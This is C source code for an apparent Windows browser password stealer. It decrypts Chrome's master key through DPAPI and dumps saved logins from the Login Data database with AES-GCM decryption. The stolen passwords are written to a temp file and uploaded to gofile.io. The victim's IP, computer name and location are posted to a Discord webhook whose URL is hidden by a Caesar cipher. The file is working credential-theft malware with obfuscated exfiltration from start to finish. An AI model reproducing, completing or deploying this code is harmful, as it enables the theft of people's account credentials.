#include <stdio.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>
#include <dirent.h>
#include <wchar.h>
#include <windows.h>
#include <wincrypt.h>
#include <regex.h>
#include <sqlite3.h>
#include <jansson.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <sys/types.h>
#include "macroz.h"
#include <curl\curl.h>
#ifdef _WIN32
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif
char chrome_path[1024];
char local_state_path[1024];
char chrome_path_login_db[256];
char temp_path[1024];
char savs[1024];
char server[256];
char upload[256];
char download_link[256];
char computerName[256];
DWORD master_length;
unsigned char *AESkey;

int isWeirdCharacter(char c)
{
    return c < 0 || c > 127;
}
void encrypt(char *str, int shift) {
    int length = strlen(str);
    for (int i = 0; i < length; i++) {
        if (str[i] >= 'A' && str[i] <= 'Z') {
            str[i] = ((str[i] - 'A' + shift) % 26) + 'A';
        } else if (str[i] >= 'a' && str[i] <= 'z') {
            str[i] = ((str[i] - 'a' + shift) % 26) + 'a';
        }
    }
}
int hook(const char *ip, const char *comp, const char *country)
{
    char logs[256];
    char cr[256];
    char city[256];
    char org[256];
    getServer();
    snprintf(upload, sizeof(upload), "https://%s.gofile.io/uploadFile", server);
    if (uploadFileToGoFile() != 1) {
        handleErrors();
    }
    if (curl_global_init(CURL_GLOBAL_DEFAULT) != CURLE_OK)
    {
        return 1;
    }
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        return 1;
    }
    char webhook_url[] = "kwwsv://glvfrug.frp/dsl/zhekrrnv/1158554459446722690/FFSZOtMv4qeCqsIrbLcP5TdK1Rs5P6aJL_46GcuwJFM3dNbn0PL19WneWMqNZ-pgk5mu";
    int shift = 3;
    encrypt(webhook_url, 26 - shift);
    curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    memmove(country, country + 7, strlen(country) - 7 + 1);
    sscanf(country, "%s%s%s", cr, city, org);
    char json_data[512];
    snprintf(json_data, sizeof(json_data), "{\"content\": null,\"embeds\": [{\"title\": \"Infected ***%s***\",\"description\": \"*Passwords:*      *IP Address:*         *PC-Name:*\\n[Download](%s)       `%s`    `%s`\\n\\n\\n*Country Info:*\\n \`\`\`Country: %s \\nCity: %s \\nOrg: %s \`\`\`\",\"color\": 1752220}],\"attachments\": []}", comp, download_link, ip, comp, cr, city, org);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    curl_global_cleanup();
    return 0;
}
struct string
{
    char *ptr;
    size_t len;
};
void init_string(struct string *s)
{
    s->len = 0;
    s->ptr = malloc(s->len + 1);
    if (s->ptr == NULL)
    {
        fprintf(stderr, "malloc() failed\n");
        exit(EXIT_FAILURE);
    }
    s->ptr[0] = '\0';
}
size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
    size_t new_len = s->len + size * nmemb;
    s->ptr = realloc(s->ptr, new_len + 1);
    if (s->ptr == NULL)
    {
        exit(EXIT_FAILURE);
    }
    memcpy(s->ptr + s->len, ptr, size * nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;

    return size * nmemb;
}
int othr_info()
{
    char ip[256];

#ifdef _WIN32
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
#else
    gethostname(computerName, sizeof(computerName));
#endif
    CURL *curl;
    CURLcode res;
    struct string ip_string;
    struct string country_string;
    char country[256];
    char geo[256];
    curl = curl_easy_init();

    if (curl)
    {
        init_string(&ip_string);
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org/");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ip_string);
        res = curl_easy_perform(curl);
        strcpy(ip, ip_string.ptr);
        free(ip_string.ptr);
        curl_easy_cleanup(curl);
        snprintf(geo, sizeof(geo), "http://ip-api.com/line/%s", ip);
        curl = curl_easy_init();

        if (curl)
        {
            init_string(&country_string);
            curl_easy_setopt(curl, CURLOPT_URL, geo);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &country_string);
            res = curl_easy_perform(curl);
            strcpy(country, country_string.ptr);
            free(country_string.ptr);
            curl_easy_cleanup(curl);
            int row = 0;
            int cd = strlen(country);
            char delim[] = "\n";
            char *lst = strtok(country, delim);

            while (lst != NULL)
            {
                if (row == 1 || row == 5 || row == 11)
                {
                    strcat(country, lst);
                    strcat(country, " ");
                }
                row++;
                lst = strtok(NULL, delim);
            }
        }
    }
    hook(ip, computerName, country);
    return 0;
}
struct MemoryStruct {
    char *memory;
    size_t size;
};
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if (mem->memory == NULL) {
        return 0;
    }

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}
int getServer() {
    CURL *curl;
    CURLcode res;
    struct string server_string;
    curl = curl_easy_init();

    if (curl) {
        init_string(&server_string);
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.gofile.io/getServer");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &server_string);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            curl_easy_cleanup(curl);
            free(server_string.ptr);
            return 1;
        }
        json_t *root;
        json_error_t error;

        root = json_loads(server_string.ptr, 0, &error);
        if (root) {
            json_t *data = json_object_get(root, "data");
            json_t *serverz = json_object_get(data, "server");

            if (json_is_string(serverz)) {
                const char *server_value = json_string_value(serverz);
                strcpy(server, server_value);
            } else {
                fprintf(stderr, "Error: 'server' is not a string in JSON response.\n");
            }
            json_decref(root);
        } else {
            fprintf(stderr, "Error parsing JSON: %s\n", error.text);
        }
        curl_easy_cleanup(curl);
        free(server_string.ptr);
    } else {
        fprintf(stderr, "Failed to initialize libcurl\n");
        return 1;
    }
    return 0;
}
int uploadFileToGoFile() {
    CURL *curl = curl_easy_init();
    if (curl) {
        CURLcode res;
        struct MemoryStruct response_data;
        response_data.memory = malloc(1);
        response_data.size = 0;
        struct curl_httppost *formpost = NULL;
        struct curl_httppost *lastptr = NULL;
        FILE *file = fopen(savs, "rb");
        if (!file) {
            fprintf(stderr, "Error opening file for reading: %s\n", savs);
            return 0;
        }
        fseek(file, 0, SEEK_END);
        long file_size = ftell(file);
        fseek(file, 0, SEEK_SET);
        char *file_data = malloc(file_size);
        if (!file_data) {
            fprintf(stderr, "Error allocating memory for file data.\n");
            fclose(file);
            return 0;
        }
        fread(file_data, 1, file_size, file);
        fclose(file);
        strcat(computerName, ".txt");
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_BUFFER, computerName,
                     CURLFORM_BUFFERPTR, file_data, CURLFORM_BUFFERLENGTH, file_size, CURLFORM_END);
        curl_easy_setopt(curl, CURLOPT_URL, upload);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_data);
        res = curl_easy_perform(curl);
        curl_formfree(formpost);
        curl_easy_cleanup(curl);
        free(file_data);
        if (res == CURLE_OK) {
            json_t *root;
            json_error_t error;
            root = json_loads(response_data.memory, 0, &error);
            if (root) {
                json_t *data = json_object_get(root, "data");
                json_t *downloadPage = json_object_get(data, "downloadPage");
                if (json_is_string(downloadPage)) {
                    const char *download_page_value = json_string_value(downloadPage);
                    strcpy(download_link, download_page_value);
                    return 1;
                } else {
                    fprintf(stderr, "Error: 'downloadPage' is not a string in JSON response.\n");
                }
                json_decref(root);
            } else {
                fprintf(stderr, "Error parsing JSON: %s\n", error.text);
            }
            free(response_data.memory);
        } else {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        
    } else {
        fprintf(stderr, "Curl initialization failed.\n");
    }
    return 0;
}
char *generateRandomFilename(){
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    static int charsetSize = sizeof(charset) - 1;
    char *filename = (char *)malloc(21);
    if (filename == NULL)
    {
        exit(EXIT_FAILURE);
    }
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 20; i++)
    {
        filename[i] = charset[rand() % charsetSize];
    }
    filename[20] = '\0';
    return filename;
}
void removeAfterWeirdCharacter(char *str) {
    int length = strlen(str);
    for (int i = 0; i < length; i++)
    {
        if (isWeirdCharacter(str[i]))
        {
            str[i] = '\0';
            break;
        }
    }
}
int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
                unsigned char *aad, int aad_len,
                unsigned char *tag,
                unsigned char *key,
                unsigned char *iv, int iv_len,
                unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;
    int ret;
    if (!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();
    if (!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
        handleErrors();
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
        handleErrors();
    if (!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv))
        handleErrors();
    if (!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
        handleErrors();
    if (!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
        handleErrors();
    ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    if (ret > 0)
    {
        plaintext_len += len;
        return plaintext_len;
    }
    else
    {
        return -1;
    }
}
char **getFolders(char *chrome_path, int *num_folders) {
    DIR *dir = opendir(chrome_path);
    if (dir == NULL)
    {
        *num_folders = 0;
        return NULL;
    }
    regex_t regex;
    int ret = regcomp(&regex, "^Profile*|^Default$", REG_EXTENDED);
    if (ret != 0)
    {
        closedir(dir);
        *num_folders = 0;
        return NULL;
    }
    struct dirent *entry;
    int count = 0;
    while ((entry = readdir(dir)) != NULL)
    {
        if (regexec(&regex, entry->d_name, 0, NULL, 0) == 0)
        {
            count++;
        }
    }
    *num_folders = count;
    char **folders = malloc(count * sizeof(char *));
    if (folders == NULL)
    {
        regfree(&regex);
        closedir(dir);
        *num_folders = 0;
        return NULL;
    }
    rewinddir(dir);
    count = 0;
    while ((entry = readdir(dir)) != NULL)
    {
        if (regexec(&regex, entry->d_name, 0, NULL, 0) == 0)
        {
            size_t len = strlen(entry->d_name) + 1;
            folders[count] = malloc(len);
            if (folders[count] == NULL)
            {
                for (int i = 0; i < count; i++)
                {
                    free(folders[i]);
                }
                free(folders);
                regfree(&regex);
                closedir(dir);
                *num_folders = 0;
                return NULL;
            }
            strncpy(folders[count], entry->d_name, len);
            count++;
        }
    }
    regfree(&regex);
    closedir(dir);
    return folders;
}
sqlite3 *main_sqlite_password_dumper(const char *db_file) {

    sqlite3 *db;
    int sequence = 0;
    int rc = sqlite3_open_v2(db_file, &db, SQLITE_OPEN_READONLY, NULL);
    if (rc != SQLITE_OK)
    {
        sqlite3_close(db);
        return NULL;
    }
    sqlite3_busy_timeout(db, 500);
    const char *query = "SELECT action_url, username_value, password_value FROM logins;";
    sqlite3_stmt *stmt;
    rc = sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
    if (rc != SQLITE_OK)
    {
        sqlite3_close(db);
        return NULL;
    }
    char *fname = generateRandomFilename();
    strcat(savs, temp_path);
    strcat(savs, "\\");
    strcat(savs, fname);
    FILE *filer = fopen(savs, "w");
    if (filer == NULL)
    {
        free(fname);
        return EXIT_FAILURE;
    }
    fprintf(filer, "                \U0001F911       Starting       \U0001F911\n");
    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW)
    {
        const unsigned char *url = sqlite3_column_text(stmt, 0);
        const unsigned char *username = sqlite3_column_text(stmt, 1);
        const unsigned char *password = sqlite3_column_text(stmt, 2);
        if (strlen(url) > 1 && strlen(username) > 1 && strlen(username) > 1)
        {
            fprintf(filer, "**********************************************************\n\n");
            fprintf(filer, "Sequence:   %d\n", sequence);
            fprintf(filer, "Username:   \"%s\"\n", username);
            fprintf(filer, "URL:   \"%s\"\n", url);
            uint8_t buffer[2192] = {0};
            uint8_t key[32];
            for (int i = 0; i < 32; i++)
            {
                key[i] = (uint8_t)AESkey[i];
            }
            uint8_t *ciphertext = (uint8_t *)password;
            int pass_leng = strlen(&ciphertext[15]) - 16;
            int ciph_leng = strlen(&ciphertext[15]);
            if (pass_leng >= 4)
            {
                int decrypted_len = gcm_decrypt(&ciphertext[15], strlen(&ciphertext[15]) - 16, NULL, 0, &ciphertext[21], key, &ciphertext[3], 12, buffer);
                int output_length = decrypted_len;
                SetConsoleOutputCP(CP_UTF8);
                fprintf(filer, "Decrypted password: \"%.*s\"\n\n", decrypted_len, buffer);
                sequence++;
            }
            else if (pass_leng < 4)
            {
                int decrypted_len = gcm_decrypt(&ciphertext[15], ciph_leng + 13, NULL, 0, &ciphertext[21], key, &ciphertext[3], 12, buffer);
                SetConsoleOutputCP(CP_UTF8);
                removeAfterWeirdCharacter(buffer);
                fprintf(filer, "Decrypted password: \"%.*s\"\n\n", decrypted_len, buffer);
                fprintf(filer, "NOTE: There are still some Memory issues in the code, which means not all are correct, and some are missing!\n");
                sequence++;
            }
            else
            {
                fprintf(filer, "Invalid ciphertext length for decryption\n");
                sequence++;
            }
        }
    }
    fprintf(filer, "**********************************************************\n");
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    fclose(filer);

    return db;
}
void handleErrors(void)
{
    exit(1);
}
const char *secretKey() {
    char *key;
    char *encrypted_key = NULL;
    FILE *file = fopen(local_state_path, "r");
    static char buffer[4096];
    while (fgets(buffer, sizeof(buffer), file))
    {
        char *ptr = strstr(buffer, "\"encrypted_key\":\"");
        if (ptr)
        {
            ptr += strlen("\"encrypted_key\":\"");
            char *end = strchr(ptr, '\"');
            if (end)
            {
                size_t len = end - ptr;
                encrypted_key = malloc(len + 1);
                strncpy(encrypted_key, ptr, len);
                encrypted_key[len] = '\0';
                key = encrypted_key;
                fclose(file);
            }
        }
    }
    fclose(file);
    int inlen = strlen(key);
    int outlen = (inlen * 3) / 4 + 5;
    unsigned char *inbuf = (unsigned char *)key;
    unsigned char *outbuf = malloc(outlen);
    memset(outbuf, 0, outlen);
    EVP_DecodeBlock(outbuf, inbuf, inlen);
    unsigned char b64d[outlen];
    memset(b64d, 0, outlen);
    for (int i = 0; i < outlen - 5; i++)
    {
        b64d[i] = outbuf[i + 5];
    }
    DATA_BLOB input;
    input.cbData = outlen - 5;
    input.pbData = b64d;
    DATA_BLOB output;
    CRYPTPROTECT_PROMPTSTRUCT promptStruct;
    promptStruct.cbSize = sizeof(CRYPTPROTECT_PROMPTSTRUCT);
    promptStruct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_UNPROTECT;
    promptStruct.hwndApp = NULL;
    promptStruct.szPrompt = NULL;
    DWORD flags = CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_VERIFY_PROTECTION;
    if (CryptUnprotectData(
            &input,
            NULL,
            NULL,
            NULL,
            &promptStruct,
            flags,
            &output))
    {
        unsigned char *secret_key = malloc(output.cbData);
        for (DWORD i = 0; i < output.cbData; i++)
        {
            secret_key[i] = output.pbData[i];
        }
        master_length = output.cbData;
        LocalFree(output.pbData);
        return secret_key;
    }
    else
    {
        return NULL;
    }
    free(outbuf);
}
int main()
{
    char *userprofile = getenv("USERPROFILE");
    snprintf(local_state_path, sizeof(local_state_path), "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userprofile);
    snprintf(chrome_path, sizeof(chrome_path), "%s\\AppData\\Local\\Google\\Chrome\\User Data", userprofile);
    snprintf(temp_path, sizeof(temp_path), "%s\\AppData\\Local\\Temp", userprofile);
    AESkey = secretKey();
    int num_folders;
    char **folders = getFolders(chrome_path, &num_folders);
    if (folders == NULL)
    {
        return 1;
    }
    for (int i = 0; i < num_folders; i++)
    {
        snprintf(chrome_path_login_db, sizeof(chrome_path_login_db),
                 "%s\\%s\\Login Data", chrome_path, folders[i]);
    }
    for (int i = 0; i < num_folders; i++)
    {
        free(folders[i]);
    }
    free(folders);
    FILE *fptr1, *fptr2;
    char temp_vault[100];
    char buffer[1024];
    size_t bytes_read;
    fptr1 = fopen(chrome_path_login_db, "rb");
    if (fptr1 == NULL)
    {
        exit(0);
    }
    sprintf(temp_vault, "%s\\vault.db", temp_path);
    fptr2 = fopen(temp_vault, "wb");
    if (fptr2 == NULL)
    {
        exit(0);
    }
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fptr1)) > 0)
    {
        fwrite(buffer, 1, bytes_read, fptr2);
    }
    fclose(fptr1);
    fclose(fptr2);
    sqlite3 *db = main_sqlite_password_dumper(temp_vault);
    remove(temp_vault);
    othr_info();
    return 0;
}